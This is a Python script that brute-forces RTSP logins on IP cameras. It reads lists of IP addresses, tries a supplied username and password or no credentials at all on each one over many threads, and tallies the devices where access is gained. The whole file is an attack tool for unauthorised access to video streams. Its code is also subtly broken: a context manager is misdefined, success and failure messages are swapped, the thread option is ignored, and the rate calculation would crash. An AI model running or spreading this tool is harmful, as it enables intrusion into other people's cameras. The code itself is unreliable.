#! /usr/bin/env python3

import cv2, contextlib, io, sys
from datetime import date
from urllib.parse import quote
from threading import Thread, Lock
from optparse import OptionParser
from colorama import Fore, Back, Style
from time import strftime, localtime, sleep, time

status_color = {
    '+': Fore.GREEN,
    '-': Fore.RED,
    '*': Fore.YELLOW,
    ':': Fore.CYAN,
    ' ': Fore.WHITE
}

def display(status, data, start='', end='\n'):
    print(f"{start}{status_color[status]}[{status}] {Fore.BLUE}[{date.today()} {strftime('%H:%M:%S', localtime())}] {status_color[status]}{Style.BRIGHT}{data}{Fore.RESET}{Style.RESET_ALL}", end=end)

def get_arguments(*args):
    parser = OptionParser()
    for arg in args:
        parser.add_option(arg[0], arg[1], dest=arg[2], help=arg[3])
    return parser.parse_args()[0]

lock = Lock()

threads = 100
verbose = False

successful_logins = []

def stdout_nil():
    original_stdout = sys.stdout
    sys.stdout = io.StringIO()
    try:
        yield
    finally:
        sys.stdout = original_stdout

def loginRTSP(ip, user, password):
    try:
        with stdout_nil:
            if user == '':
                video_capture = cv2.VideoCapture(f"rtsp://{ip}")
            else:
                video_capture = cv2.VideoCapture(f"rtsp://{user}:{password}@{ip}")
        if video_capture.isOpened():
            return True
        else:
            return False
    except:
        return False
def loginHandler(ips, user, password, verbose=False):
    global successful_logins
    for ip in ips:
        login_status = loginRTSP(ip, user, password)
        if login_status:
            with lock:
                successful_logins.append(ip)
                if verbose:
                    display('+', f"{Back.MAGENTA}{ip}{Back.RESET} => Access Granted\tAccess Gained = {Back.MAGENTA}{len(successful_logins)}{Back.RESET}")
                else:
                    display('-', f"{Back.MAGENTA}{ip}{Back.RESET} => Access Denied")

if __name__ == "__main__":
    arguments = get_arguments(('-i', "--ip", "ip", "File Name of List of IP Addresses (Seperated by ',')"),
                              ('-u', "--user", "user", "Username for Brute Force"),
                              ('-p', "--password", "password", "Password For Brute Force"),
                              ('-t', "--threads", "threads", f"Number of Threads for Brute Force (Default={threads})"),
                              ('-v', "--verbose", "verbose", f"Dislay Additional Information (True/False, Default={verbose})"),
                              ('-w', "--write", "write", "Name of the File for the Successfully Logged In IPs to be dumped (default=current data and time)"))
    if not arguments.ip:
        display('-', "Please Provide a List of IP Addresses")
        exit(0)
    if not arguments.user:
        display('*', f"No {Back.MAGENTA}USER{Back.RESET} Specified")
        display(':', f"Trying to Find {Back.MAGENTA}Unauthorized Access{Back.RESET}")
        arguments.user = ''
    else:
        arguments.user = quote(arguments.user)
    if not arguments.password:
        display('*', f"No {Back.MAGENTA}PASSWORD{Back.RESET} Specified")
        display(':', f"Setting Password to {Back.MAGENTA}Blank{Back.RESET}")
        arguments.password = ''
    else:
        arguments.password = quote(arguments.password)
    if not arguments.threads:
        arguments.threads = threads
    else:
        arguments.threads = int(threads)
    if arguments.verbose == "True":
        arguments.verbose = True
    else:
        arguments.verbose = False
    if not arguments.write:
        arguments.write = f"{date.today()} {strftime('%H_%M_%S', localtime())}"
    ips = []
    arguments.ip = arguments.ip.split(',')
    display(':', "Loading IP Addresses from Files")
    for ip_file in arguments.ip:
        try:
            with open(ip_file, 'r') as file:
                ips.extend([ip for ip in file.read().split('\n') if ip != ''])
        except FileNotFoundError:
            display('-', f"File {Back.YELLOW}{ip_file}{Back.RESET} not Found!")
        except:
            display('-', f"Error while reading File {Back.YELLOW}{ip_file}{Back.RESET}")
    total_ips = len(ips)
    display('+', "Loaded IP Addresses from Files")
    display(':', f"Total Number of IP Addresses = {Back.MAGENTA}{total_ips}{Back.RESET}")
    display(':', f"Creating {Back.MAGENTA}{arguments.threads}{Back.RESET}", start='\n')
    ip_division = [ips[group*total_ips//arguments.threads:(group+1)*total_ips//arguments.threads] for group in range(arguments.threads)]
    display('+', f"Created {Back.MAGENTA}{arguments.threads}{Back.RESET}")
    display(':', f"Starting {Back.MAGENTA}{arguments.threads}{Back.RESET}", start='\n')
    t1 = time()
    threads = []
    for thread_index, ip_group in enumerate(ip_division):
        threads.append(Thread(name=f"rtsp_brute_force_thread_{thread_index}", target=loginHandler, args=(ip_group, arguments.user, arguments.password, arguments.verbose,)))
        threads[-1].start()
    display(':', f"Started All {Back.MAGENTA}{arguments.threads}{Back.RESET}")
    for thread in threads:
        thread.join()
    t2 = time()
    display('+', f"All Threads Completed Execution")
    display(':', f"\tTotal IP Addresses       = {Back.MAGENTA}{total_ips}{Back.RESET}")
    display(':', f"\tSuccessful Authorization = {Back.MAGENTA}{len(successful_logins)}{Back.RESET}")
    display(':', f"\tTime Taken               = {Back.MAGENTA}{t2-t1:.2f} seconds{Back.RESET}")
    display(':', f"\tRate                     = {Back.MAGENTA}{len(total_ips)/(t2-t1):.2f} IPs/second{Back.RESET}")